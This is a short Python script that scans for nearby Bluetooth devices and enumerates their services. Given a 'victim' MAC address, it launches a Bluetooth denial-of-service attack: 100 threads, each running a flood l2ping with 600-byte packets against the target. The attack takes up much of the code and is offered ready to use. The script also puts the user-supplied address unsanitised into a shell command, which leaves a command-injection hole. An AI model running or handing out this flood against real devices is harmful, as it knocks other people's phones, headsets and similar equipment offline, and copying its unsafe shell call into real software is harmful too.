#!/usr/bin/env python3

import bluetooth
import scapy
import threading, time
import argparse, os

def get_my_bluetooth_device():
    print("Personnal device")
    try:
        os.system("hcitool dev")
    except:
        print("Error:")
        print("Check if you bluetooth is enable")

def scan_bluetooth_system():
    try:
       os.system('hcitool scan')
    except:
        print("Error: ")
        print("Check if you bluetooth is enable")

def scan_bluetooth_personnal():
    print("Scanning nerby bluetooth devices...") 
    try:
        nearby_devices = bluetooth.discover_devices(lookup_names=True, duration=30, flush_cache=True)
        index = 1
        for addr, name in nearby_devices:
            print("[Numero] :", index)
            print("[Devices Names] :", name)
            print("[Addresse MAC] :", addr)
            services = bluetooth.find_service(address=addr)
            print("[Service] :")
            if len(services) <= 0:
                print("\t\tNo Services found.")
            else:
                for serv in services:
                    print("\t\tservice -> {}.".format(serv['name']))
                    print("\t\thost -> {}".format(serv['host']))
                    print("\t\tdescription -> {}".format(serv['description']))
                    print("\t\tprovider -> {}".format(serv['provider']))
                    print("\t\tprotocol -> {}".format(serv['protocol']))
                    print("\t\tprofiles -> {}".format(serv['profiles']))
                    print("\t\tservice-id -> {}".format(serv['service-id']))
                    print("\t\tservice-classes -> {}".format(serv['service-classes']))
                    print("\t\t______________________")
            print("")
            index = index + 1
    except:
        print("Error: Check if you bluetooth is enable")        

def l2ping_attack(vic_addr_mac):
    try:
        os.system("sudo l2ping -i hci0 -s 600 -f {}".format(vic_addr_mac))
    except:
        print("Error: ")
        print("Check if you have l2ping on your system")

def DOS_Attack(vic_addr_mac):
    for i in range(0, 100):
        threading.Thread(target=l2ping_attack, args=[vic_addr_mac]).start()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="By default this tool display your bluetooth mac address and scan bluetooth devices at proximity")
    parser.add_argument(
        "-V",
        "--victim",
        help="MAC Address of your victim"
    )
    args = parser.parse_args()    
    
    if args.victim:
        try:
            vic_addr_mac = args.victim
            DOS_Attack(vic_addr_mac=vic_addr_mac)
        except KeyboardInterrupt:
            print('\n[*] Aborted')
            exit(0)
        except Exception as e:
            print('\n[!] ERROR: ' + str(e))
            exit(0)
    else:
        get_my_bluetooth_device()
        print("")
        scan_bluetooth_personnal()
